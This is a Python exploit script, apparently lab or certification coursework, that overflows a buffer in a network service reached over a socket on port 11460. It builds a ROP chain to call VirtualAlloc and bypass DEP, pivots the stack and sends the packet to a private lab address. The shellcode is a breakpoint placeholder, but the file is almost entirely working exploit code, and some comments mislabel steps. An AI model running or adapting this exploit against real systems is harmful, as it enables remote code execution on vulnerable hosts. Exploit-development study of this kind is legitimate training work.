import socket
import sys
from struct import pack

OFFSET_TO_EIP = 276

badchars = [0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20]

# psAgentCommand
buf = bytearray([0x41]*0xC)
buf += pack("<i", 0x534)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x500)  # 1st memcpy: size field
buf += pack("<i", 0x0)    # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x0)    # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# VirtualAlloc
va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address ; 0x00
va += pack("<L", (0x46464646)) # Shellcode Return Address	; 0x04
va += pack("<L", (0x47474747)) # # dummy Shellcode Address	; 0x08
va += pack("<L", (0x48484848)) # dummy dwSize 				; 0x0c
va += pack("<L", (0x49494949)) # # dummy flAllocationType 	; 0x10
va += pack("<L", (0x51515151)) # dummy flProtect			; 0x14

# psCommandBuffer
offset	= b"A" * (OFFSET_TO_EIP - len(va))
eip		= pack("<L", (0x50501110)) # push esp ; push eax ; pop edi; pop esi ; save &ESP in ESI

# GOALS: Use IDA Pro to obtain the IAT address for VirtualAlloc (imports tab) : This gives us &(VirtualAlloc IAT)
# GOALS: Create a ROP chain to obtain the stack address that contains the VirtualAlloc placeholder value.
# GOALS: Create a ROP chain that fetches the VirtualAlloc address.
# GOALS: Create a ROP chain that patches the VirtualAlloc address.

# STEP 1. locate address on the stack where the dummy DWORD is
# STEP 2. resolve the address of VirtualAlloc
# STEP 3. write that value on top of the placeholder value

rop  = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn           ; put &ESP in EAX 
rop += pack("<L", (0x42424242)) # junk                                   ; 
rop += pack("<L", (0x505115a3)) # pop ecx ; ret                          ; 
rop += pack("<L", (0xffffffe4)) # -0x1C                                  ; distance to 'dummy VirutalAlloc Address'
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret                     ; EAX = (dummy VirutalAlloc Address)
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret               ; ESI = (dummy VirutalAlloc Address)
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret                          ; EAX = &(VirtualAlloc IAT + 1)
rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1                   ; (VirtualAlloc IAT + 1) because 0x20 is badchar
rop += pack("<L", (0x505115a3)) # pop ecx ; ret                          ; 
rop += pack("<L", (0xffffffff)) # -1 into ecx                            ; distance to VirtualAlloc IAT
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret                     ; EAX = &VirtualAlloc IAT
rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret             ; EAX = VirtualAlloc IAT
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret             ; *dummy VirutalAlloc Address = VirtualAlloc IAT

# manually place the shellcode address on the stack and simulate a real call after the API finishes. 
# Align ESI with the placeholder value for the return address on the stack.
# Dynamically locate the address of the shellcode and use it to patch the placeholder value.

# GOALS: Update the ROP chain to increase ESI by four.
# GOALS: Update the ROP chain to gather the shellcode address on the stack by adding a placeholder offset to ESI.
# GOALS: Overwrite the dummy return address using ROP with the newly calculated return address.

# STEP 4.  Use an INC ESI instruction to increment the value in the ESI register.
# STEP 5.  Copy ESI into EAX while keeping the existing value in ESI for patching the placeholder value.
# STEP 6.  Use a negative value to avoid null bytes when adding a small positive offset to EAX.
# STEP 7.  Pop the negative value into ECX and use a SUB EAX, ECX instruction to set up EAX correctly.
# STEP 8. Update the fixed value to correctly align with the beginning of the shellcode once the ROP chain is built.

rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ; ESI contains (dummy VirtualAlloc Address) 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ;
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ; 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ; add four to ESI to get (Shellcode Return Address)
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret           ; Copy ESI into EAX
rop += pack("<L", (0x42424242)) # junk                                   ; 
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret               ; keep existing value in ESI for patching placeholder value
rop += pack("<L", (0x505115a3)) # pop ecx ; ret                          ; negative value to avoid null bytes 
rop += pack("<L", (0xfffffdf0)) # -0x210                                 ; (arbitrary can change when rop chain is built)
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret                     ; EAX contains a placeholder address for our shellcode
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret             ; overwrite the fake shellcode address (0x46464646)
#                                                                        ; dd poi(esi) L4

# lpAddress is our shellcode address
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ; ESI contains (Shellcode Return Address)
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ;
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ; 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ; add four to ESI to get (dummy Shellcode Address)
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret           ; Copy ESI into EAX
rop += pack("<L", (0x42424242)) # junk                                   ; 
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret               ; keep existing value in ESI for patching placeholder value
rop += pack("<L", (0x505115a3)) # pop ecx ; ret                          ; negative value to avoid null bytes 
rop += pack("<L", (0xfffffdf0)) # -0x21C                                 ; (arbitrary can change when rop chain is built -4 from last time)
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret                     ; EAX contains a placeholder address for our shellcode
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret             ; overwrite the fake shellcode address (0x46464646)

# dwSize should be 0x1
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ; ESI contains (dummy Shellcode Address)
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ;
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ; 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ; add four to ESI to get (dummy dwSize)
rop += pack("<L", (0x50514884)) # xor eax, eax ; inc eax ; ret           ; this also gives 1
# rop += pack("<L", (0x5053a0f5)) # pop eax ; ret					     ; need the value 1 for 1 page nulls so negate
# rop += pack("<L", (0xffffffff)) # -1								     ; value that is negated
# rop += pack("<L", (0x50527840)) # neg eax ; ret 						 ; negate to get 1
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret			 ; *dwSize = 0x1

# flAllocationType 0x1000
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ; ESI contains (dummy Shellcode Address)
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ;
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ; 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ; add four to ESI to get (dummy dwSize)

# 0:006> ? 0x1000 - 0x80808080
# Evaluate expression: -2155901056 = ffffffff`7f7f8f80
# 0:006> ?0x80808080 + 0x7f7f8f80
# Evaluate expression: 4294971392 = 00000001`00001000
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret							 ; we need to get 0x1000 in here 
rop += pack("<L", (0x80808080)) # 80808080								 ; first value to be added
rop += pack("<L", (0x505115a3)) # pop ecx ; ret                          ; need the value to add to eax
rop += pack("<L", (0x7f7f8f80)) # 7f7f8f80								 ; second value to be added
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret                     ; eax = 80808080 + 0x7f7f8f8 = 0x1000
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret			 ; *dwSize = 0x1
# bp 0x5051579a ".if (@eax & 0x0`ffffffff) = 0x80808080 {} .else {gc}"

# flProtect 0x40
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ; ESI contains (dummy Shellcode Address)
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ;
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ; 
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret           ; add four to ESI to get (dummy dwSize)
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret							 ; we need to get 0x1000 in here 
rop += pack("<L", (0x80808080)) # 80808080								 ; first value to be added
rop += pack("<L", (0x505115a3)) # pop ecx ; ret                          ; need the value to add to eax
rop += pack("<L", (0x7f7f7fc0)) # 0x7f7f7fc0								 ; second value to be added
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret                     ; eax = 80808080 + 0x7f7f8f8 = 0x1000
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret			 ; *dwSize = 0x1
# rop += pack("<L", (0x5051e4db)) # int3 ; push eax ; call esi			 ; BREAK POINT FOR TESTING

# This ROP gadget moves the content of the ESI register into the EAX register and then pops a value into ESI before returning. It is used to copy the stack address of the last argument (flProtect) from ESI to EAX.
rop += pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
# This line adds a junk value (0x42424242) as a placeholder. It is required because the previous gadget pops a value into ESI before returning.
rop += pack("<L", (0x42424242)) # junk
# This ROP gadget pops a value into the ECX register and then returns. It is used to load the negative offset value (0xffffffe8) into ECX.
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
# This line adds the negative offset value (0xffffffe8) to the ROP chain, which will be loaded into the ECX register. This value will be added to the EAX register to align it with the VirtualAlloc address on the stack.
rop += pack("<L", (0xffffffe8)) # negative offset value
# This ROP gadget adds the content of the ECX register to the EAX register and then returns. It is used to add the negative offset value (0xffffffe8) to EAX, aligning it with the VirtualAlloc address on the stack.
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
# This ROP gadget exchanges the content of the EAX register with the content of the EBP register and then returns. It is used to move the aligned address from EAX to EBP, preparing for the next gadget.
rop += pack("<L", (0x5051571f)) # xchg eax, ebp ; ret
# This ROP gadget moves the content of the EBP register into the ESP register, effectively aligning the stack pointer (ESP) with the VirtualAlloc address on the stack. It then pops a value into EBP before returning. This gadget is the final step before executing VirtualAlloc.
rop += pack("<L", (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret
# bp 0x5050118e ".if @eax = 0x40 {} .else {gc}"

# we have 232 bytes here
padding = b"C" * 0xe8

# we have 240 bytes here 
shellcode = b"\xcc" * (0x400 - (len(offset) + len(va) + len(rop) + len(padding) ))
stage_two = b"\x41" * 350

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % \
    (offset + va + eip + rop + padding + shellcode + stage_two, 0, 0, 0, 0)
buf += formatString

# Checksum
buf = pack(">i", len(buf)-4) + buf

def main():

	server = "192.168.196.10"
	port = 11460

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))

	s.send(buf)
	s.close()

	print("[+] Packet sent")
	sys.exit(0)

if __name__ == "__main__":
 	main()